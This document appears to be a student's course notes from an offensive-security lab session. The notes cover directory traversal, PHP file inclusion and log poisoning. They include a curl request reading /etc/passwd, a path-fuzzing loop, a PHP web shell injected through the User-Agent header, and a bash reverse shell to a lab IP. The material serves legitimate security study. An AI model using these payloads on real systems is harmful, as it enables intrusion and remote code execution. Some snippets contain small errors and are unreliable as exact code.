---
index: true
course: "thm"
chapter: "Offensive security"
concept: "Session 9"
---


#### directory traversal vuln
- PHP files - Hypertext preprocessor
	- A executable file on server side that generate dynamic html files to be sent to client
	- attack vector - 
		- rce 
		- path discovery/traversal
- Exercise worked example
	- urls use [[URL encoding]] 
	- a path like 
		- **..**/../../etc/passwd
		- become
		- **%2e%2e**/%2e%2e/%2e%2e/etc/passwd
	- `curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
	- `Permissions 0644 for '/home/kali/dt_key' are too open.`
		- means the rsa key file has perm besides read for owner (400).
grafana example
	- generate a list of possible permuatation of path using python
		- pattern = '../'
		- for i in range(10):
			- printf("http://ipaddress:3000/public/plugin/stat{}/Users/install", i\*pattern)
	- paste it into a file and use xargs to run this command
		- cat file | xargs -I {} curl --path-as-is {} > results
	- find flag in list
		- grep 'OS{' results

#### File inclusion
- path traversal - viewing content of file
- file inclusion - executing files
- goal
	- used for performing RCE
- common in php vulnerability
##### PHP wrapper
- file://
- http://
- php:// - IO streams
- ftp:// - ftp protocol
- data:// - inline data
- phar:// read/exec php archive files
- zip:// open zip file
- expect:// - exec pecl (require pecl)
##### Log poisoning
- appending commands in log files to be executed using LFI
- example
	- find log file in directory
		- http:url/index.php?page=/var/log/apache2/access.log
	- inject to log file by manipulating request header
		- user agent - appends to log file
			- runner - `<?php echo system($_GET['cmd']); ?>`
		- command
			- send a GET php request. This will be ran by the setter
			- `GET meteor/index.php?page=../../../../../../../../var/log/apache2/access.log&cmd=ps`
				- GET - request
				- meteor.../access - directory
				- &cmd=ps - set variable "cmd" to ps. parsed to runner
			- bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1" set up revshell with a wrapped bash command as the command is not ran as a shabang script but rather in the terminal
note : bak.php are backup files and are human readable
how the exploit works is the page is generate using index.php which has a line that checks for what page is being loaded. This can be directly edited to gain access to unintended directories leading to path traversal.

The user agent is part of the access.log file which allow for rce via code injection and lfi by using a get request to run the code loaded as a param of the path